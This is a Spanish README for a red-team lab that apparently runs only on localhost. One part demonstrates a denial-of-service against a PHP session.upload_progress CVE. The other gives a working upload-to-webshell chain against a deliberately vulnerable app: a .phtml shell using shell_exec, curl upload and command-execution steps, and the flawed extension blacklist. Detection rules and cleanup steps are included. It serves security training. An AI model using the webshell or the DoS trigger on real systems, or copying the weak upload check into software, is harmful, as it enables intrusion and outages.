# PHP2Shell Red Team Lab — de OOM a RCE

> **Entorno aislado en `127.0.0.1`.** El lab tiene dos actos:
>
> 1. **CVE-2026-109618/619:** demostrar el impacto del fallo de
>    `session.upload_progress` (DoS por caída del worker FPM + escritura de
>    sesión sin `session_start()`).
> 2. **RCE:** obtener ejecución de comandos en una **app PHP vulnerable por
>    diseño** incluida en el lab, leer `/flag.txt` y cerrar el engagement.
>
> **Importante:** el RCE del acto 2 **no explota** el CVE de corrupción de
> memoria. Es una cadena de subida de fichero → webshell sobre un target de
> entrenamiento (`target/`). No incluye heap grooming ni exploit del CVE.
> No expongas nada de esto fuera de loopback.

---

## Misión y puntuación

La misión se evalúa con `lab/mission.json`. La flag solo se genera al completar
los **100 puntos**:

| Objetivo | Puntos | Qué demuestra |
|---|---:|---|
| `recon` | 15 | PHP/nginx, versión afectada y handler activo |
| `validate` | 20 | Sesión escrita con ID del cliente sin `session_start()` |
| `impact` | 25 | OOM → worker caído → 502/reset |
| `evidence` | 15 | Fatal + `exited with code 70` + 502 correlacionados |
| `rce` | 25 | Webshell `.phtml` + `cat /flag.txt` en el target |

La flag se escribe en `lab/reports/FLAG.txt` y el scoreboard en
`lab/reports/scoreboard.md`.

---

## Quick start

```bash
# Todo el engagement (acto 1 + acto 2 + flag)
./lab/run-lab.sh

# Más presión en el acto 1
./lab/run-lab.sh --sustain 15 --concurrency 4

# Solo acto 1 (la flag queda bloqueada)
./lab/run-lab.sh --skip-rce

# Acto 1b: mismo trigger contra mod_php real (8.5.11 + Apache)
./lab/run-modphp.sh

# Al terminar, limpiar
./lab/run-lab.sh --cleanup
```

Artefactos:

```
lab/reports/engagement-<UTC>.md|json   # informe del acto 1
lab/reports/rce-<UTC>.md|json          # informe del acto 2
lab/reports/scoreboard.md              # puntuación
lab/reports/FLAG.txt                   # flag (si se captura)
lab/reports/<UTC>-fpm.log              # PHP-FPM
lab/reports/<UTC>-nginx.log            # nginx
lab/reports/<UTC>-evidence.txt         # collect-evidence.sh
```

---

## Actividad OS — memoria, procesos y sistemas de archivos

El acto 1 se puede convertir en una actividad de sistemas operativos. En vez
de quedarse en “el worker cayó”, se instrumentan y correlacionan:

- **memoria:** Zend MM vs cgroup v2 (`memory.current/peak/max/events`),
  `VmSize`/`VmRSS`, page faults y `mmap` de 2 MiB;
- **procesos:** máster/worker FPM, `exit code 70`, `exit_group(70)`, respawn,
  `pids.current/max` y el `502` de nginx;
- **filesystem:** `/tmp` como `tmpfs` (64 MiB, `noexec`), inodo/modo de
  `sess_*`, rootfs `ro` y la diferencia entre escribir e interpretar un
  fichero.

```bash
# Flujo completo: baseline -> sesión -> strace + OOM -> snapshot final
./lab/os-activity/run-activity.sh --start

# Sin strace (solo /proc, cgroup, pidstat y logs)
./lab/os-activity/run-activity.sh --start --no-trace

# Evidencias y resumen
ls -la lab/os-activity/out/latest/
```

Material:

- [`os-activity/README.md`](os-activity/README.md) — guía y tareas.
- [`os-activity/worksheet.md`](os-activity/worksheet.md) — hoja del alumno.
- [`os-activity/instructor-notes.md`](os-activity/instructor-notes.md) — soluciones.
- `os-activity/collect-snapshot.sh`, `trace-worker.sh`, `run-activity.sh`.

> La actividad es **solo del acto 1**. No incluye RCE ni heap grooming; el
> target de entrenamiento solo se usa, si está levantado, para comparar
> montajes.

---

## Fase 0 — Reglas de enfrentamiento (ROE)

1. **Autorización por escrito**, aunque sea tu propio lab.
2. **Alcance:** `http://127.0.0.1:8080/` (CVE), `http://127.0.0.1:8082/`
   (target RCE) y `http://127.0.0.1:8081/` (parcheado, opcional).
3. **Ventana y criterio de parada:** si el host pierde capacidad de respuesta,
   `Ctrl-C` y `docker compose down -v`.
4. **Datos:** no uses ficheros reales; los scripts generan basura.
5. **Guardas:** `rt.py` y `rce.py` rechazan hosts no loopback salvo
   `--authorized`.

```bash
python3 lab/rt.py --help
python3 lab/rce.py --help
```

---

# ACTO 1 — CVE-2026-109618/619

## Fase 1 — Reconocimiento

```bash
docker compose up -d
docker compose ps
curl -sS http://127.0.0.1:8080/      # ok pid=... peak=... limit=4M
curl -sS http://127.0.0.1:8082/      # portal vulnerable por diseño
```

Huella automatizada:

```bash
python3 lab/rt.py recon --url http://127.0.0.1:8080/
```

Salida esperada:

```
[1] recon : php=True version=8.5.11 probe_ok=True crash=False
```

Huella manual:

```bash
curl -sSI http://127.0.0.1:8080/
docker compose exec -T php php -v
docker compose exec -T php php -i | grep -E \
  'session.upload_progress|memory_limit|max_multipart_body_parts|max_file_uploads'
```

**Criterio de éxito:** `probe_ok=True`. Si el probe benigno ya da 502, sube
`memory_limit` o reduce `--size`.

---

## Fase 2 — Validación del handler

```bash
python3 lab/rt.py validate \
  --url http://127.0.0.1:8080/ \
  --docker-inspect
```

Salida esperada:

```
[2] validate : status=200 session_file=True marker=RT...
```

Evidencia cruda:

```bash
docker compose exec -T php sh -c \
  'for f in /tmp/sess_*; do grep -aq RT /tmp/sess_* && { echo "--- $f"; head -c 400 "$f"; }; done'
```

**Hallazgo:** escritura de sesión con ID controlado por el cliente. El parser
ejecuta lógica de sesión antes del script de la aplicación.

---

## Fase 3 — Impacto (OOM controlado)

```bash
python3 lab/rt.py impact --url http://127.0.0.1:8080/
```

Presión sostenida (con `pm.max_children=1`):

```bash
python3 lab/rt.py impact \
  --url http://127.0.0.1:8080/ \
  --repeat 5 --concurrency 4 --sustain 15 --max-requests 40
```

Métricas del informe:

| Métrica | Significado |
|---|---|
| `ok_200` | peticiones servidas |
| `http_5xx` | 502 por worker muerto |
| `transport_errors` | reset / conexión cortada |
| `availability` | `ok_200 / total` |
| `latency_p50/p95/max` | degradación observable |

Variantes con el reproductor original:

```bash
python3 trigger.py --url http://127.0.0.1:8080/ --mode parts --parts 4000
python3 trigger.py --url http://127.0.0.1:8080/ --mode names --parts 1000 --name-len 1024
```

**Criterio de éxito:** al menos un 502/reset y en logs:

```
PHP Fatal error: Allowed memory size of 4194304 bytes exhausted ... in Unknown on line 0
WARNING: [pool www] child N exited with code 70 ...
NOTICE: [pool www] child M started
```

### Comparación con el parcheado

```bash
docker compose -f docker-compose.fixed.yml up -d
python3 lab/rt.py impact --url http://127.0.0.1:8081/ --repeat 3
```

Ambos devuelven 502: el límite duro se alcanza igual. El parche cambia el
manejo interno del OOM, no la disponibilidad bajo carga extrema.

### 3.5 Variante real mod_php (Apache + PHP 8.5.11)

El RCE de CVE-2026-109618 se documenta en **mod_php**, no en FPM. El lab incluye
esa variante para reproducir el comportamiento real del SAPI:

```bash
./lab/run-modphp.sh
# o manualmente:
docker compose -f docker-compose.modphp.yml up -d
python3 trigger.py --url http://127.0.0.1:8083/ --mode progress
docker compose -f docker-compose.modphp.yml logs --since=5m
```

Resultado observado con el trigger de 1 MiB:

```
HTTP 500 Internal Server Error
PHP Fatal error: Allowed memory size of 4194304 bytes exhausted
  (tried to allocate 1052672 bytes) in Unknown on line 0
```

Es decir: el fallo ocurre en `php_request_startup()` también en mod_php y el
cliente recibe 500. **No aparece SIGSEGV con este trigger**: para pasar de OOM
a corrupción explotable hace falta heap grooming, que no forma parte de este
PoC. La variante mod_php sirve para comparar el comportamiento del SAPI real,
no para obtener RCE.

---

## Fase 4 — Evidencia y correlación

```bash
./collect-evidence.sh | tee lab/reports/evidence-manual.txt
docker compose logs --since=10m php   | tail -n 80
docker compose logs --since=10m nginx | tail -n 40
```

| Evidencia | Significado |
|---|---|
| `Fatal ... in Unknown on line 0` | fallo en startup, antes del script |
| `child ... exited with code 70` | worker muerto por fatal |
| `child ... started` | respawn del máster |
| `502` + `unexpected FastCGI record` | corte visible al cliente |
| `signal 11 (SIGSEGV)` | corrupción de memoria |
| `sess_*` con `upload_progress_*` | handler ejecutado sin la app |

---

# ACTO 2 — RCE en el target de entrenamiento

> Esta fase **no** explota CVE-2026-109618/619. El target es una app PHP
> creada para el lab, con una vulnerabilidad deliberada de subida de ficheros.
> El objetivo es practicar la fase final de un engagement: foothold, ejecución
> de comandos, captura de flag y evidencia.

## Fase 5 — Cadena de explotación

### 5.1 Verificar el target

```bash
curl -sS http://127.0.0.1:8082/
docker compose ps target
```

### 5.2 Manual: subir el webshell

```bash
cat > /tmp/rt_shell.phtml <<'PHP'
<?php echo "RT:"; echo shell_exec($_GET["cmd"] ?? "id"); ?>
PHP

curl -sS -F 'avatar=@/tmp/rt_shell.phtml;filename=rt_shell.phtml' \
  http://127.0.0.1:8082/upload.php | grep -o 'uploads/rt_shell.phtml'

curl -sS 'http://127.0.0.1:8082/uploads/rt_shell.phtml?cmd=id'
curl -sS 'http://127.0.0.1:8082/uploads/rt_shell.phtml?cmd=cat%20/flag.txt'
```

### 5.3 Automatizado

```bash
python3 lab/rce.py --url http://127.0.0.1:8082/
```

Salida esperada:

```
[1] upload  : rt_xxxx.phtml -> HTTP 200 ok=True
[2] rce     : $id -> 'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n'
[2] rce     : $hostname -> '...'
[2] rce     : $cat /flag.txt -> 'FLAG{php2shell_rce_by_design}\n'
[3] flag    : OK FLAG{php2shell_rce_by_design}
```

### 5.4 Por qué funciona (vulnerabilidades deliberadas)

| Elemento | Configuración insegura |
|---|---|
| Validación de subida | blacklist que solo bloquea `.php` exacto; permite `.phtml` |
| Ejecución | `target/apache-vuln.conf` mapea `.phtml` a PHP |
| Directorio | `uploads/` escribible (tmpfs) y servido por Apache |
| Flag | `/flag.txt` legible por `www-data` dentro del contenedor |

Código relevante en `target/www/upload.php`:

```php
if (preg_match('/\.php$/i', $name)) {
    $msg = 'Extension .php bloqueada.';
} else {
    move_uploaded_file($f['tmp_name'], __DIR__ . '/uploads/' . $name);
}
```

### 5.5 Evidencia

`lab/rce.py` genera `lab/reports/rce-<UTC>.json|md` con:

- fichero subido y URL del webshell,
- salida de `id`, `hostname` y `cat /flag.txt`,
- comparación con `target/flag.txt`,
- veredicto `flag_ok`.

---

# Cierre del engagement

## Fase 6 — Detección (blue team)

Reglas:

- `lab/detections/sigma-php-fpm-oom-upload-progress.yml`
- `lab/detections/sigma-php-fpm-worker-respawn.yml`
- `lab/detections/sigma-nginx-fastcgi-502.yml`
- `lab/detections/suricata-php2shell.rules`

Consultas rápidas:

```bash
# Elastic / OpenSearch
message:"Allowed memory size" and message:"in Unknown on line 0"
status:502 and (message:"unexpected FastCGI record" or message:"upstream prematurely closed")
```

## Fase 7 — Captura de la flag

```bash
python3 lab/rt.py capture \
  --fpm-log lab/reports/<UTC>-fpm.log \
  --nginx-log lab/reports/<UTC>-nginx.log \
  --rce-report lab/reports/rce-<UTC>.json
```

Salida esperada:

```
[x] Reconocimiento del stack                  15 pts
[x] Validacion del handler                    20 pts
[x] Denegacion de servicio                    25 pts
[x] Evidencia correlacionada                  15 pts
[x] RCE en target de entrenamiento            25 pts
[i] score   : 100/100
[+] FLAG    : FLAG{php2shell_...}
```

`./lab/run-lab.sh` lo hace automáticamente al final.

## Fase 8 — Cleanup

```bash
docker compose exec -T php sh -c 'rm -f /tmp/sess_*'
docker compose down -v
docker compose -f docker-compose.fixed.yml down -v
docker compose -f docker-compose.modphp.yml down -v
rm -f /tmp/sess_* /tmp/rt_shell.phtml 2>/dev/null || true
```

El target usa `tmpfs` para `uploads/`, así que el webshell desaparece al bajar
el stack. No persiste en el host.

---

## Mapeo ATT&CK

| Fase | Técnica | ID |
|---|---|---|
| Recon | Active Scanning | T1595 |
| Acto 1 | Exploit Public-Facing Application | T1190 |
| Acto 1 | Endpoint Denial of Service | T1499 |
| Acto 2 | Exploit Public-Facing Application (upload) | T1190 |
| Acto 2 | Server Software Component: Web Shell | T1505.003 |
| Acto 2 | Command and Scripting Interpreter: Unix Shell | T1059.004 |
| Cierre | Indicator Removal | T1070 |

---

## OPSEC y notas

- **Ruido:** el acto 1 genera fatal + respawn; el acto 2 deja un `.phtml` en
  `uploads/`. Ambos son trivialmente detectables.
- **Rate limit:** `--max-requests` (50 por defecto) acota el acto 1.
- **Sin persistencia:** el webshell vive en `tmpfs`; no se escribe en el host.
- **Sin lateral movement:** el target solo tiene su flag y su red de lab.
- **Flag fija:** `target/flag.txt` es parte del material del reto.

---

## Límites del lab

| Fuera de alcance | Motivo |
|---|---|
| Exploit de CVE-2026-109618/619 | Requiere heap grooming y engineering específico; no se implementa |
| RCE vía corrupción de memoria | El RCE del acto 2 es una app vulnerable por diseño, no el CVE |
| Persistencia / pivoting | No aporta al objetivo y aumenta el riesgo |
| Evasión WAF avanzada | Se documenta como recomendación defensiva |

El lab demuestra **impacto real del CVE (DoS + session write)** y **RCE real
contra un target de entrenamiento**, manteniendo separadas ambas cosas.

---

## Troubleshooting

| Síntoma | Causa probable | Acción |
|---|---|---|
| `probe_ok=False` y 502 en recon | `memory_limit` demasiado bajo | Subir a `8M` o bajar `--size` |
| `session_file=False` | Handler deshabilitado o `save_path` distinto | Revisar `php -i`, `php/php.ini` |
| `docker inspect` falla | Stack apagado o proyecto distinto | `docker compose ps`, `--compose-file` |
| Impacto sin 502 | `memory_limit=-1` o worker con más RAM | Revisar configuración |
| Target RCE no responde | Puerto ocupado | `LAB_TARGET_PORT=18082 docker compose up -d` y `--target-url` |
| Upload 200 pero webshell no ejecuta | `.phtml` no mapeado | Revisar `target/apache-vuln.conf` |
| Flag no coincide | `target/flag.txt` modificado | Restaurar el valor del repo |
